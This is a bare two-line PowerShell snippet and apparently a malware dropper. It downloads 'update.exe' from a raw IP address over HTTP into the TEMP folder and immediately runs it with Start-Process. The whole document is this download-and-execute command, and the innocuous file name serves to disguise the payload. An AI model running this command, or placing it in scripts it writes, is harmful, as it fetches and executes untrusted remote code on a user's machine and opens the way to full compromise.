(New-Object Net.WebClient).DownloadFile("http://93.184.216.34/update.exe", "$env:TEMP\update.exe")
Start-Process "$env:TEMP\update.exe"
